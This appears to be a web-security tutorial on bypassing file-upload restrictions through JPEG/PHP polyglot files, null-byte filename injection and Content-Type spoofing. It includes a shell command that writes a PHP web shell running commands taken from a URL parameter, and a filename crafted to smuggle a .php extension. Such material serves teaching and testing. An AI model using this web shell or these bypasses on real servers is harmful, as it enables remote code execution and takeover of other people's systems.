
# Bypassing File Upload Controls

Developers use the accept HTML attribute in file input elements to specify the types of files that the browser should allow users to select for upload. 

By default, this attribute restricts files based on their extensions or ==Multipurpose Internet Mail Extensions (MIME) types==.
```html
<input type="file" name="file" accept=".jpeg, .jpg, .gif, .png">
```


# Malicious Polyglot Files

A **polyglot file** is a single file that is simultaneously valid in two (or more) different formats, depending on how you open or interpret it.

==Malicious polyglot files could potentially circumvent security measures
that validate a file’s extension or content type==.


As an example, let’s consider the header for a JPEG image file.

Ordinar­ily, JPEG files start with the standard magic byte signature of FF D8 FF E0,followed by additional bytes:
```
FF D8 FF E0 00 10 4A 46 49 46 00 01
```

Display first line of file on hex
```sh
xxd -R always 5651960.jpg | head -n 1
```

We could try disguising the PHP web shell code as an innocent image file by cleverly ==appending the JPEG magic bytes to it==, as demonstrated here:
```sh
echo -e "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x00\x01<?php
eval($_GET['cmd'];?>" > polyglot.php
```
This bash command creates a malicious `polyglot​.php` file with initial bytes suggesting that it is a JPEG file.
After those bytes, however, we introduce PHP code.

# Many tools and libraries can help us manipulate image file headers. 

Examples include hex editors like `HxD` (Windows), `Hex Fiend` (macOS), and `Bless` (Linux) and libraries like `libjpeg` and `libpng`. 

The powerful `ImageMagick` and `ExifTool` command line tools can also manipulate a wide range of image file formats.

#  Certain conditions must exist for the malicious polyglot to work. 

First, when a user uploads the file, the server must interpret it as an image and save it successfully. 

Second, when the user requests the file, the PHP interpreter generating the response must recognize the file as a script and process it. 

In some cases, the file might need a ​`.php` extension to trigger PHP processing.

# Null byte poisoning

Null byte poisoning, also known as null byte injection or null character
injection, is used to manipulate file-handling systems that rely on null-
terminated strings. 

This technique takes advantage of the presence of the null byte `\x00`, which marks the end of a string in various programming languages.

This attack injects the null byte into the filename string, causing it to
be truncated and potentially leading to unintended behavior.

For instance, an attacker could rename `webshell.php` to `webshell.jpg%00.php` , injecting the URL-encoded representation of the null byte into the filename right after the `.jpg` extension.

When processing the filename, a server may interpret it as `webshell.jpg`, unaware of the presence of the null byte and the subsequent ​ `.php` extension. However, when the server later processes the file, it could read the file as a PHP script and execute the web shell.


# Content-Type header manipulation

Content-Type header manipulation, also known as MIME type spoofing, is a file upload control bypass technique that leverages the manipulation of the Content-Type header in the HTTP request sent during the file upload.

By changing the header to an allowed content type, we can potentially bypass the server-side file checks.


